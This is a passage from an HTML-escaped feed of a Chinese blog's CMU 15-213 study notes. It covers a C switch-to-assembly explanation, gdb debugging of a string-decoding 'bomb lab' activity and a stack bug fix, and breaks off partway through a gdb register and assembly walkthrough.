class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;dest&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         val &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; c &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         val &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         val &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;         val &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;dest &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;注意 &lt;code&gt;case 4&lt;/code&gt;  中，按理来说 &lt;code&gt;.L4&lt;/code&gt;  时 &lt;code&gt;val = a&lt;/code&gt;  而不是 &lt;code&gt;*dest = val&lt;/code&gt; （汇编来看）。这里我们再将 C 编译成汇编语句时，对 C 语言的语句做了一个优化，将 &lt;code&gt;*dest = val&lt;/code&gt;  转化为两句：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;val &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;dest &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; val&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这样转化的原因&lt;strong&gt;是在 C 语言中 &lt;code&gt;*dest = val&lt;/code&gt;  是所有语句共同需要执行的部分，因此我们将它放在 &lt;code&gt;switch&lt;/code&gt;  语句之外，而将 &lt;code&gt;val = a&lt;/code&gt;  放在语句内&lt;/strong&gt;。这样语句前后意思是一样的，而 &lt;code&gt;switch&lt;/code&gt;  语句的目的也达到了。而汇编层面做了优化，将 &lt;code&gt;*dest = val&lt;/code&gt;  直接放在 &lt;code&gt;.L6&lt;/code&gt;  处，其他语句执行完后跳转到 &lt;code&gt;.L6&lt;/code&gt; 。&lt;/p&gt;
</content>
        <updated>2024-02-29T09:14:07.000Z</updated>
    </entry>
    <entry>
        <id>https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20activity/</id>
        <title>15-213 Bomb lab Activity 记录</title>
        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20activity/"/>
        <content type="html">&lt;h2 id=&#34;part-i&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#part-i&#34;&gt;#&lt;/a&gt; Part I&lt;/h2&gt;
&lt;p&gt;输入如下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -o phase1 -g -std=c99 phase1.c
$ gdb ./phase1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;按照 handout 依次输入命令并观察结果。&lt;/p&gt;
&lt;h3 id=&#34;打断点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#打断点&#34;&gt;#&lt;/a&gt; 打断点&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;(gdb) break main
Breakpoint 1 at 0x13b2: file phase1.c, line 54.
(gdb) break unscramble
Breakpoint 2 at 0x1308: file phase1.c, line 39.
(gdb) break reverse
Breakpoint 3 at 0x1274: file phase1.c, line 30.
(gdb) break toggleCase
Breakpoint 4 at 0x11e7: file phase1.c, line 18.
(gdb) info break
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x00000000000013b2 in main at phase1.c:54
2       breakpoint     keep y   0x0000000000001308 in unscramble at phase1.c:39
3       breakpoint     keep y   0x0000000000001274 in reverse at phase1.c:30
4       breakpoint     keep y   0x00000000000011e7 in toggleCase at phase1.c:18
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;运行程序-打印值&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#运行程序-打印值&#34;&gt;#&lt;/a&gt; 运行程序 &amp;amp; 打印值&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;(gdb) run
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/lab2_handout/phase1

Breakpoint 1, main () at phase1.c:54
54      int main () &amp;#123;
(gdb) n
55          word_t *secret_msg = (word_t *) calloc(1, sizeof(word_t));
(gdb) n
56          secret_msg-&amp;gt;str = (char *) calloc(length, sizeof(char));
(gdb) print *(word_t*)secret_msg
$1 = &amp;#123;str = 0x0, len = 0&amp;#125;
(gdb) next
57          strncpy(secret_msg-&amp;gt;str, &amp;quot;!312 Av XPHy QBBt&amp;quot;, length);;
(gdb) print *(word_t*)secret_msg
$2 = &amp;#123;str = 0x5555555592c0 &amp;quot;&amp;quot;, len = 0&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;单步调试-watchpoint&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#单步调试-watchpoint&#34;&gt;#&lt;/a&gt; 单步调试 &amp;amp; watchpoint&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Breakpoint 2, unscramble (msg=0x555555555480 &amp;lt;__libc_csu_init&amp;gt;) at phase1.c:39
39      void unscramble (word_t *msg) &amp;#123;
(gdb) step
41          char chng = 13;
(gdb) next
42          for (int i = 0; i &amp;lt; msg-&amp;gt;len; i++) &amp;#123;
(gdb) next
43              ltr = msg-&amp;gt;str[i];
(gdb) print(ltr)
$3 = 85 &#39;U&#39;
(gdb) print isAlpha(ltr)
$4 = true
(gdb) watch ltr
Hardware watchpoint 5: ltr
(gdb) c
Continuing.

Hardware watchpoint 5: ltr

Old value = 85 &#39;U&#39;
New value = 33 &#39;!&#39;
unscramble (msg=0x5555555592a0) at phase1.c:44
44              if (isAlpha(ltr)) &amp;#123;
(gdb) step
isAlpha (ltr=85 &#39;U&#39;) at phase1.c:13
13      bool isAlpha (char ltr) &amp;#123;
(gdb) backtrace
#0  isAlpha (ltr=85 &#39;U&#39;) at phase1.c:13
#1  0x0000555555555345 in unscramble (msg=0x5555555592a0) at phase1.c:44
#2  0x0000555555555429 in main () at phase1.c:60
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3-questions&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-questions&#34;&gt;#&lt;/a&gt; 3 Questions&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;What does  &lt;code&gt;unscramble(word_t *msg)&lt;/code&gt;  do? And how?&lt;br&gt;
 将 &lt;code&gt;secret_msg&lt;/code&gt;  指向的结构体中的 &lt;code&gt;!312 Av XPHy QBBt&lt;/code&gt;  替换成了 &lt;code&gt;!312 Ni KCUl DOOg&lt;/code&gt; 。&lt;br&gt;
 &lt;code&gt;unscramble&lt;/code&gt;  的作用是：判断 &lt;code&gt;msg_str&lt;/code&gt;  当前的字符，如果 &lt;code&gt;M &amp;lt; ltr &amp;lt;= Z&lt;/code&gt; ，就将其字符值减去 13。否则加上 13。&lt;/li&gt;
&lt;li&gt;What does  &lt;code&gt;reverse(word_t *msg)&lt;/code&gt;  do? And how?&lt;br&gt;
 将 &lt;code&gt;secret_msg&lt;/code&gt;  指向的结构体中的 &lt;code&gt;!312 Ni KCUl DOOg&lt;/code&gt;  替换成了 &lt;code&gt;gOOD lUCK iN 213!&lt;/code&gt; 。该函数反转字符串。&lt;/li&gt;
&lt;li&gt;What does  &lt;code&gt;toggleCase(word_t *msg)&lt;/code&gt;  do? And how?&lt;br&gt;
 将 &lt;code&gt;secret_msg&lt;/code&gt;  指向的结构体中的 &lt;code&gt;gOOD lUCK iN 213!&lt;/code&gt;  替换成了 &lt;code&gt;Good Luck In 213!&lt;/code&gt; 。该函数反转字符串大小写。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;part-ii&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#part-ii&#34;&gt;#&lt;/a&gt; Part II&lt;/h2&gt;
&lt;p&gt;输入 &lt;code&gt;gcc -std=c99 -o phase2 -g phase2.c&lt;/code&gt;  编译生成 &lt;code&gt;phase2&lt;/code&gt; ，对其利用 &lt;code&gt;gdb&lt;/code&gt;  进行排错发现 &lt;code&gt;S-&amp;gt;top-&amp;gt;len&lt;/code&gt;  为 0，导致浮点数相除时发生错误。我们进行如下修改：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在初始化栈的时候让栈顶的长度为 0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;push&lt;/code&gt;  新结点的时候让结点的 &lt;code&gt;len&lt;/code&gt;  为栈顶结点的长度加 1，然后让栈顶指向结点&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pop&lt;/code&gt;  时结点弹出，栈顶指向的新结点的长度值为弹出结点长度减 1&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2024-02-29T09:11:59.000Z</updated>
    </entry>
    <entry>
        <id>https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/gdb%20&amp;%20asm%20activity/</id>
        <title>15-213 GDB and Assembly Activity 记录</title>
        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/gdb%20&amp;%20asm%20activity/"/>
        <content type="html">&lt;h2 id=&#34;activity-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#activity-1&#34;&gt;#&lt;/a&gt; Activity 1&lt;/h2&gt;
&lt;p&gt;运行&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb ./act1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; r &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;出现如下提示:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;If you have questions about the commands, type (gdb) help &amp;lt;command&amp;gt;
Now type (gdb) info registers
This will display all of the integer registers.
Registers are basically the only local &amp;quot;variables&amp;quot; in assembly.
They are not located in memory, but instead directly within the CPU core.
  As such, they have no memory addresses and are referred to by name.
Although historically each register had a special purpose, now only %rsp does.
  It points to the top of the stack.
Look over the other registers: do any of them have familiar values, such as 1?
Q.  Given the information that GDB just stopped the program at the beginning
    of a function taking one or more arguments, write down your best guess at the
    purposes of the %rsp, %rdi, and %rax registers.

During this activity, gdb will print ... SIGTRAP ....  This is expected.
It indicates that the program, such as act1, triggered a breakpoint.
When you are finished looking at the registers, type r 2 &amp;lt;enter&amp;gt;
GDB may ask you if you want to start the program from the beginning (y or n) y

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据提示，输入 &lt;code&gt;info registers&lt;/code&gt;  后，显示值如下：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; info registers&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rax            0x4f                &lt;span class=&#34;token number&#34;&gt;79&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rbx            0x0                 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rcx            0x7ffff7ec3297      &lt;span class=&#34;token number&#34;&gt;140737352839831&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rdx            0x0                 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rsi            0x6042a0            &lt;span class=&#34;token number&#34;&gt;6308512&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rdi            0x1                 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rbp            0x0                 0x0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rsp            0x7fffffffde40      0x7fffffffde40&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r8             0x4f                &lt;span class=&#34;token number&#34;&gt;79&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r9             0x39                &lt;span class=&#34;token number&#34;&gt;57&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r10            0x400397            &lt;span class=&#34;token number&#34;&gt;4195223&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r11            0x246               &lt;span class=&#34;token number&#34;&gt;582&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r12            0x400590            &lt;span class=&#34;token number&#34;&gt;4195728&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r13            0x7fffffffdf40      &lt;span class=&#34;token number&#34;&gt;140737488346944&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r14            0x0                 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r15            0x0                 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rip            0x40077f            0x40077f &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;printStep2+19&lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;eflags         0x246               &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt; PF ZF IF &lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cs             0x33                &lt;span class=&#34;token number&#34;&gt;51&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ss             0x2b                &lt;span class=&#34;token number&#34;&gt;43&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ds             0x0                 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;es             0x0                 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token parameter variable&#34;&gt;--Type&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;RET&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; more, q to quit, c to &lt;span class=&#34;token builtin class-name&#34;&gt;continue&lt;/span&gt; without paging--&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fs             0x0                 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gs             0x0                 &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;该处 &lt;code&gt;%rdi&lt;/code&gt;  寄存器的值为 1， &lt;code&gt;%rsp&lt;/code&gt;  的值为 &lt;code&gt;0x7fffffffde40&lt;/code&gt; , &lt;code&gt;%rax&lt;/code&gt;  的值为 &lt;code&gt;79&lt;/code&gt; 。 &lt;code&gt;%rsp&lt;/code&gt;  寄存器中存储的值应当是地址， &lt;code&gt;%rax&lt;/code&gt;  中存储返回值， &lt;code&gt;%rdi&lt;/code&gt;  中存储传入参数。&lt;/p&gt;
&lt;p&gt;接下来输入 &lt;code&gt;r 2&lt;/code&gt; 。提示信息如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) r 2
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act1 2
Let&#39;s look at some assembly and registers.
There are two styles of assembly printing: AT&amp;amp;T and Intel
AT&amp;amp;T prints OP SRC, DEST, while Intel prints OP DEST, SRC
OP - opcode or instruction such as mov, ret, add, etc
SRC - source or input, instructions may have 0, 1, or 2 sources
DEST - destination, update this location, instructions may have 0 or 1
        destinations
Linux is based on Unix which was originally developed at Bell Labs, so GNU tools
default to AT&amp;amp;T style printing.
Also, sometimes a DEST is also a SRC, kind of like x += 5
Type (gdb) c
This will continue execution, please do so after each question.

Program received signal SIGTRAP, Trace/breakpoint trap.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该提示介绍了一下 &lt;code&gt;AT &amp;amp; T&lt;/code&gt;  格式和 &lt;code&gt;intel&lt;/code&gt;  格式的区别，主要是 &lt;code&gt;src&lt;/code&gt;  和 &lt;code&gt;dest&lt;/code&gt;  的位置不一样。按照提示输入 &lt;code&gt;c&lt;/code&gt;  查看：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.
You will commonly dissassemble a function.  There will be a header and footer.
Most of the output will be 0x....... &amp;lt;+0&amp;gt;:  OP SRC, DEST
This indicates that at address 0x..., which is 0 bytes from the start of the
function, there is an instruction OP with SRC and DEST as shown.
Type (gdb) disassemble squareInt
MOV is a common and powerful instruction.  It can &amp;quot;move&amp;quot; (actually, copy) values
